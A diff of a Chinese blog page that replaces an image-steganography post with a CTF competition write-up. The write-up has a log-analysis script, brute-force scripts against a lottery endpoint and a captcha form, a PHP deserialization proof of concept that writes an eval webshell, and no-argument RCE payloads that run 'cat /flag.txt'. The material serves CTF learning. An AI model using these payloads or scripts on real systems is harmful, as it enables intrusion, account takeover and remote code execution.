@@ -11,7 +11,7 @@
   
 
   
-  <title itemprop="name">图片隐写总结 | 雨过天晴&amp;伞落人离&#39;s Blog</title>
+  <title itemprop="name">川传CTF WP | 雨过天晴&amp;伞落人离&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -403,175 +403,314 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
           <header class="entry-header">
-            <h1 class="entry-title">图片隐写总结</h1>
-            <p class="entry-census">&nbsp;·&nbsp;2021-5-20&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+            <h1 class="entry-title">川传CTF WP</h1>
+            <p class="entry-census">&nbsp;·&nbsp;2021-5-23&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
 
             <hr>
           </header>
         
         <div class="entry-content">
-          <h1 id="CTF-图片隐写总结"><a href="#CTF-图片隐写总结" class="headerlink" title="CTF 图片隐写总结"></a>CTF 图片隐写总结</h1><p>最近CTF遇到不少隐写题，总结来说一般就是先是几大步骤。binwalk，zsteg，stegsolve一把梭。先看binwalk能不能提取一些有意思的隐藏文件，然后提取出来。zsteg其实对于隐写来说很强，它可以一把梭LSB,MSB。StegSolve可以直接提取出plan图。具体我也用Python照着教程复现了一下其功能。顺手学习Python PIL库，和基本图片原理。</p>
-<pre><code class="python">from PIL import Image
-import glob, os
-import sys
+          <h2 id="misc-日志分析"><a href="#misc-日志分析" class="headerlink" title="misc-日志分析"></a>misc-日志分析</h2><p>下载得到access.log简单分析发现时SQL注入流量分析。写个脚本简单筛选以下</p>
+<pre><code class="python">from urllib import parse
+
+with open(&#39;./access.log&#39;,mode=&#39;r&#39;) as file:
+    with open(&#39;./raw.log&#39;,mode=&#39;w&#39;) as out:
+        for line in file.readlines():
+            t = parse.unquote(line) 
+            print(t)
+            if &#39;flag&#39; not in t:
+                pass
+            else:
+                out.write(t)
+</code></pre>
+<p>这样一来就导出了含有flag字段的行。接下来需要判断flag各个位的字符，简单看一下使用的是时间盲注，观察发现为！=所采用的数字对应的ascii值则为flag字段一部分。在写个脚本处理</p>
+<pre><code class="python">import re
+
+flag=[]
+pattern = re.compile(r&#39;!=[\d]*&#39;)
+with open(&#39;./raw.log&#39;,mode=&#39;r&#39;) as file:
+    for line in file.readlines():
+        temp = pattern.findall(line)
+        if len(temp)!=0:
+            print(temp[0])
+            _,num=temp[0].split(&#39;!=&#39;)
+            flag.append(chr(int(num)))
+for a in flag:
+    print(a,end=&#39;&#39;)
+</code></pre>
+<p><code>flag&#123;3287fe300f28e24aefa2d86883832c9f&#125;</code></p>
+<h2 id="web-抽奖"><a href="#web-抽奖" class="headerlink" title="web-抽奖"></a>web-抽奖</h2><p>简单转轮抽奖。看源码分析得知抽奖数据通过data.php以json数据返回。写脚本爆破</p>
+<pre><code class="python">import requests
+import json
 import multiprocessing
-import time
 
 
-def get_plane(img, channel, index=0):
-    print(&#39;run&#39;)
-    color_mode = channel
-    offset = index
-    if channel in img.mode:
-        new_image = Image.new(&#39;1&#39;, img.size)
-        new_image_data = new_image.load()
-
-        img_data = img.load()
-
-        channel_index = img.mode.index(channel)
-
-        for x in range(img.size[0]):
-            for y in range(img.size[1]):
-                color = img_data[x, y]
-
-                channel = color[channel_index]
-
-                plane = bin(channel)[2:].zfill(8)
-                try:
-                    new_image_data[x, y] = 255 * int(plane[abs(index - 7)])
-                except IndexError:
-                    pass
-
-        new_image.save(f&#39;&#123;color_mode&#125;-&#123;offset&#125;.png&#39;)
-        return new_image
+def solve():
+    while True:
+        text=requests.get(&#39;http://42.193.13.21:51735/data.php&#39;).content.decode(&#39;utf-8&#39;)
+        text=json.loads(text)
+        tmp=text[&#39;flag&#39;]
+        tmp=tmp.encode(&#39;utf-8&#39;)
+        print(tmp.decode(&#39;utf-8&#39;))
 
 if __name__ == &#39;__main__&#39;:
-    file = input(&#39;输入图片名称: &#39;)
-    imag = Image.open(file)
-    for channel in imag.mode:
-        for plane in range(8):
-
-            t=multiprocessing.Process(target=get_plane,args=(imag, channel, plane),daemon=True)
-            t.start()
-
-    temp=input(&#39;...&#39;)
-    temp=input(&#39;...&#39;)
+    for i in range(20):
+        p=multiprocessing.Process(target=solve,daemon=True)
+        p.start()
+        if i==19:
+            p.join()
 </code></pre>
-<p>其步骤就是，打开图片，然后将其进行模式分离。一般来说图片都采取RGB(A)形式存储。通过使用PIL内置的方法可以实现分离读取。总的来说PIL和cv一样，对图片数据进行操作都是使用一个二维数组，二维数组可以近似看作图片(x,y)坐标对应的像素，其为RGB三个值组成的元组。再通过下标选取，即可实现提取某一通道的效果。</p>
-<p>再看一道题，四川省省赛的WP misc</p>
-<p><img src="/2021/05/20/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/2.png" alt="2"></p>
-<p>上来三件套，那自然是</p>
-<p><img src="/2021/05/20/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/B-0.png" alt="B-0"></p>
-<p>B通道Plane为0时得到这么多的二维码。扫描其中一个二维码得到整数。再结合原图不难想到解题思路就是按照二维码扫描出的数值进行复位拼接。主要就是两个问题，二维码和原图的分割，二维码的扫描和图片的复位这里参考下别人的WP</p>
-<pre><code class="python">from PIL import Image
-import numpy
-import pyzbar.pyzbar as pyzbar
-# 打开图片
-raw = Image.open(&#39;./Jigsaw1.png&#39;)
-print(&quot;Image size: &quot;, raw.size) # 打印碎片图大小
-
-# 获取LSB隐写图像
-_, _, blue = raw.split()
-lsb = Image.eval(blue, lambda p: 255 if p&amp;1 else 0)
-lsb.show()
-
-# 单独获取每个小块
-pice_size = numpy.array(raw.size)//100 # 因为二维码每行100个
-pice_size=tuple(pice_size)
-print(&quot;Pice size: &quot;, pice_size) # 打印每个二维码大小
-
-# 还原图像
-fixed = Image.new(raw.mode, raw.size)
-def getValue(code):
- value = &quot;&quot;
- for data in code:
-  value = data.data.decode(&#39;utf-8&#39;)
- return value
-
-for x in range(100):
- for y in range(100):
-  pice = Image.new(raw.mode, pice_size) # 新建一个色彩通道和大小均与单个二维码相同的空白图片作为复位的底板图
-  pos = numpy.array([x, y])*pice.size # 标记出二维码坐标
-
-  pice.paste(lsb, (-pos[0], -pos[1])) # 把二维码提取出来粘上去
-  tmp=pice.resize((550,550),Image.ANTIALIAS) # Image.ANTIALIAS抗锯齿 调整大小
-  code =(pyzbar.decode(tmp))
-  value=(int(getValue(code)))
-  pice.paste(raw, (-pos[0], -pos[1])) # 把碎块图放到白板上覆盖二维码
-  fixed.paste(pice, (value%100*pice.size[0], value//100*pice.size[1])) # 移到填补画布
- fixed.show()
- print(x, &quot;%&quot;)
- fixed.save(&quot;result.png&quot;)
+<pre><code>好不容易抽个三等奖，还是没有FLAG，嘿嘿!
+奖都没拿到就想要FLAG?
+奖都没拿到就想要FLAG?
+你看看你，看看你，成天就想要FLAG!
+好不容易抽个三等奖，还是没有FLAG，嘿嘿!
+flag&#123;4a346639-087e-6554-4788-48994edf0fe5&#125;
+好不容易抽个三等奖，还是没有FLAG，嘿嘿!
+奖都没拿到就想要FLAG?
 </code></pre>
-<p>照着原理优化了一下</p>
-<pre><code class="python">from PIL import Image
-import numpy as np
-import pyzbar.pyzbar as pyzbar
+<h2 id="web-Source"><a href="#web-Source" class="headerlink" title="web-Source"></a>web-Source</h2><p>访问index.php?source=1得到第一题</p>
+<pre><code class="php">&lt;?php
+
+class Getflag&#123;
+    protected $value=1;
+
+    public function __destruct()&#123;
+        echo $this-&gt;value;
+    &#125;
+
+&#125;
+$a=new Getflag();
+echo urlencode(serialize($a));
+//O%3A7%3A&quot;Getflag&quot;%3A1%3A&#123;s%3A8%3A&quot;%00*%00value&quot;%3Bi%3A1%3B&#125;
+</code></pre>
+<p>双写绕过,使用GetGetflagflag，作为作为对象名这样在<code>str_replace</code>后就会被替换为<code>Getflag</code></p>
+<pre><code class="php">&lt;?php
+
+error_reporting(0);
+
+include(&#39;flag.php&#39;);
+
+if($_GET[&#39;source&#39;] == 1)&#123;
+
+    highlight_file(&quot;sssssource.txt&quot;);
+
+&#125;
+
+
+class Getflag&#123;
+
+    protected $value=0;
+
+
+    public function __destruct()&#123;
+
+        echo $this-&gt;value;
+
+        if($this-&gt;value==1)
+
+            show_flag();
+
+        else
+
+            die(&#39;nonono&#39;);   
+    &#125;
+&#125;
+
+$ans=$_GET[&#39;ans&#39;];
+
+$ans=str_replace(&#39;Getflag&#39;, &#39;&#39;, $ans);
+
+unserialize($ans);
+
+
+if(isset($_GET[&#39;A&#39;]) &amp;&amp; isset($_GET[&#39;B&#39;]))&#123;
+
+    $md51=md5($_GET[&#39;A&#39;]);
+
+    $md52=md5($_GET[&#39;B&#39;]);
+
+    if($md51 == $md52)&#123;
+
+        show_source(__FILE__);
+  &#125;
+&#125;
+
+?&gt;
+</code></pre>
+<p>简单的md5绕过，考虑采用数组绕过</p>
+<p><code>?source=1&amp;A[]=a&amp;B[]=b</code></p>
+<p>最后一层</p>
+<pre><code class="php">&lt;?php
+
+error_reporting(0);
+
+show_source(__FILE__);
+
+class CatchRecord &#123;
+
+
+        public $filename,$out,$msg;
+
+
+        public function __wakeup()&#123;
+
+                $this-&gt;filename = 1;
+
+        &#125;
+
+
+        public function __destruct()&#123;
+
+                if ($this-&gt;filename != 0)
+
+                        $this-&gt;filename = &quot;error.log&quot;;
+
+                else
+
+                        $this-&gt;filename = &quot;access.log&quot;;
+
+                $this-&gt;out = date(&quot;Y/m/d/H/i/s&quot;).&quot; &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;].&quot;:&quot;.$this-&gt;msg;
+
+                file_put_contents($this-&gt;filename, $this-&gt;out);
+
+        &#125;
+
+&#125;       
+
+
+$ans=$_GET[&#39;ans&#39;];
+
+unserialize($ans); 
+</code></pre>
+<p>构造poc</p>
+<pre><code class="php">&lt;?php
+
+class CatchRecord &#123;
+
+
+        public $filename,$out,$msg;
+
+
+        public function __wakeup()&#123;
+
+                $this-&gt;filename = 1;
+
+        &#125;
+
+
+        public function __destruct()&#123;
+
+                if ($this-&gt;filename != 0)
+
+                        $this-&gt;filename = &quot;error.log&quot;;
+
+                else
+
+                        $this-&gt;filename = &quot;access.log&quot;;
+
+                $this-&gt;out = date(&quot;Y/m/d/H/i/s&quot;).&quot; &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;].&quot;:&quot;.$this-&gt;msg;
+
+                file_put_contents($this-&gt;filename, $this-&gt;out);
+
+        &#125;
+
+&#125; 
+
+$a=new CatchRecord();
+
+$a-&gt;filename=0;
+
+$a-&gt;out=&amp;$a-&gt;filename;
+
+$a-&gt;msg=&#39;&lt;?php eval($_POST[a]);?&gt;/../../../../../../webshell.php&#39;;
+
+var_dump(urlencode(serialize($a)));
+
+?&gt;
+
+//O%3A11%3A%22CatchRecord%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bi%3A0%3Bs%3A3%3A%22out%22%3BR%3A2%3Bs%3A3%3A%22msg%22%3Bs%3A55%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B%3F%3E%2F..%2F..%2F..%2F..%2F..%2F..%2Fwebshell.php%22%3B%7D
+
+</code></pre>
+<p>会在当前目录下生成webshell.php</p>
+<p><code>2020/08/21/11/12/33 172.16.101.234:&lt;?php eval($_POST[a]);?&gt;/../../../../../../webshell.php</code></p>
+<p>AntSword连接cat flag</p>
+<p>flag{a6751d78-d89a-798e-590e-026327cb7749}</p>
+<h2 id="web-baopo"><a href="#web-baopo" class="headerlink" title="web-baopo"></a>web-baopo</h2><p>验证码爆破</p>
+<pre><code class="python">import requests
+import base64
 import threading
 import time
 
-lock = threading.Lock()
 
+url = &quot;http://42.193.13.21:51310/yzm.php&quot;
 
-def scan(img):
-    data = pyzbar.decode(img)
-    for data in data:
-        return data.data.decode(&#39;utf-8&#39;)
+num_arr = []
+t_list = []
 
+for x in range(0,1000000):
+    num = base64.b64encode(str(x).zfill(6).encode()).decode()
+    num_arr.append(num)
 
-# img = Image.open(&#39;./B-0.png&#39;)
-# default_img = Image.open(&#39;./2.png&#39;)
-# tinkered_img = Image.new(mode=default_img.mode, size=default_img.size)
-# print(img.size)
-# qr_size = tuple(np.array(img.size) // 100)
-# print(qr_size)
+print(len(num_arr))
 
-tinkered_img = Image.new(mode=&#39;RGB&#39;, size=(2700, 2700))
-
-
-def solve(start: int, end: int):
-    global tinkered_img
-    img = Image.open(&#39;./B-0.png&#39;)
-    default_img = Image.open(&#39;./2.png&#39;)
-
-    qr_size = tuple(np.array(img.size) // 100)
-    for y in range(start, end):
-        for x in range(100):
-            print(f&#39;(&#123;x&#125;,&#123;y&#125;)&#39;)
-            box = (qr_size[0] * x, qr_size[1] * y, qr_size[0] * (x + 1), qr_size[1] * (y + 1))
-            temp = img.crop(box)
-            puzzle = default_img.crop(box)
-            temp = temp.resize((550, 550), Image.ANTIALIAS)  # 经测试 27x27大小图片手机可以扫出来但是pyzbar读不出来故重新调整大小后扫描
-            # temp.show()
-
-            info = int(scan(temp))
-            print(info)
-            row = (info // 100) * qr_size[0]  # 行坐标
-            column = (info % 100) * qr_size[1]  # 列坐标
-            dig_row = ((info // 100) + 1) * qr_size[0]
-            dig_column = ((info % 100) + 1) * qr_size[1]
-            paste_box = (column,row  , dig_column,dig_row)
-            with lock:
-                tinkered_img.paste(puzzle, paste_box)
-    with lock:
-        tinkered_img.show()
-
-
-t = threading.Thread(target=solve, args=(0, 25))
-t.start()
-t1 = threading.Thread(target=solve, args=(25, 50))
-t1.start()
-t2 = threading.Thread(target=solve, args=(50, 75))
-t2.start()
-t3 = threading.Thread(target=solve, args=(75, 100))
-t3.start()
-t.join()
-t1.join()
-t2.join()
-t3.join()
-
+def bp(num):
+    data = &#123;
+        &quot;yzm&quot; : num
+    &#125;
+    header = &#123;
+        &quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;
+    &#125;
+    try:
+        res = requests.post(url=url, data=data, headers=header, timeout=1.5)
+        if &quot;错误&quot; not in res.text:
+            f = open(&quot;yzm&quot;, &quot;w+&quot;)
+            f.write(num)
+            f.close()
+    except Exception as e:
+        f = open(&quot;err&quot;,&quot;a&quot;)
+        f.write(num+&quot;\n&quot;)
+    
+for x in range(1, len(num_arr)):#这里设置从哪里开始到哪里结束
+    t = threading.Thread(target=bp, args=(num_arr[x], ))
+    t_list.append(t)
+    if x % 300 == 0:#这里调线程,err里是超时
+        for t in t_list:
+            t.start()
+        t_list = []
+        print(x)
+        time.sleep(5)
 </code></pre>
-<p>值得注意的是，<code>paste</code>函数可以传一个tuple即可，不需要指出全部四个参量。还有就是二维码扫描对图片大小可能有一定要求，扫描前最好resize。在Image的坐标是笛卡尔坐标系，以(0,0)起始。</p>
+<p>得到验证码，进行找回密码，账号是admin。进入后发现经典无参rce</p>
+<pre><code class="php">&lt;?php
+if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    
+    eval($_GET[&#39;code&#39;]);
+&#125; else &#123;
+    show_source(__FILE__);
+&#125;
+?&gt;
+</code></pre>
+<p>借鉴两位师傅写的wp</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45449318/article/details/105237550">https://blog.csdn.net/qq_45449318/article/details/105237550</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3537">https://xz.aliyun.com/t/3537</a></li>
+</ul>
+<p>先</p>
+<pre><code class="php">?code = print_r(getcwd());
+=&gt;查看路径下内容没有可用的
+?code = print_r(scandir(getcwd()))
+=&gt;探测上一级为Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag_phpbyp4ss [3] =&gt; html )
+?code = print_r(scandir(dirname(getcwd())))
+</code></pre>
+<p>这题flag在根目录所以要多层嵌套</p>
+<p><code>?code=print_r(scandir(dirname(dirname(dirname(getcwd())))));</code></p>
+<p>得到</p>
+<pre><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; boot [5] =&gt; dev [6] =&gt; etc [7] =&gt; flag.txt [8] =&gt; home [9] =&gt; lib [10] =&gt; lib64 [11] =&gt; media [12] =&gt; mnt [13] =&gt; my_init [14] =&gt; my_service [15] =&gt; opt [16] =&gt; proc [17] =&gt; root [18] =&gt; run [19] =&gt; sbin [20] =&gt; srv [21] =&gt; sys [22] =&gt; tmp [23] =&gt; usr [24] =&gt; var ) ;
+</code></pre>
+<p>然后</p>
+<p><code>?code=system(end(current(get_defined_vars())));&amp;b=cat /flag.txt</code></p>
+<p><code>flag&#123;3b49971b-ad5a-656f-bc6f-1f60b31fcb96&#125;</code></p>
+<p>得到flag 此处payload参考师傅博客（<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45449318/article/details/105237550%EF%BC%89">https://blog.csdn.net/qq_45449318/article/details/105237550）</a></p>
 
         </div>
         <!-- .entry-content -->
@@ -600,28 +739,11 @@ t3.join()
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                一道php题目的复现 one_pointer_php</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/05/14/python%E5%B9%B6%E8%A1%8C2/" rel="next">
+            <a href="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/" rel="next">
               <div class="background">
                 <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
@@ -629,7 +751,7 @@ t3.join()
               Next Post</span>
               <div class="info">
                 <h3>
-                python并行2</h3>
+                一道php题目的复现 one_pointer_php</h3>
                 <hr>
               </div>
             </a>
